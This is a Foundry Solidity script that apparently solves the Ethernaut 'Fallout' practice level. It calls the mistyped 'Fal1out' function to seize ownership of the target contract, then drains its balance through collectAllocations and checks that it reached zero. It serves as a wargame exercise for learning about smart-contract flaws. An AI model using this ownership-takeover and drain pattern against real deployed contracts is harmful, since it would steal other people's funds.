// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;
import "forge-std/Script.sol";
import "../src/Fallout/Fallout.sol";

contract FalloutScript is Script {
    function run() public {
        address falloutAddress = vm.envAddress("FALLOUT_ADDRESS");
        Fallout ethernautFallout = Fallout(payable(falloutAddress));

        uint256 deployerKey = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(deployerKey);

        ethernautFallout.Fal1out();

        ethernautFallout.collectAllocations();
        require(address(ethernautFallout).balance == 0, "contract not drained");

        vm.stopBroadcast();
        console.log("SUCCESS");
    }
}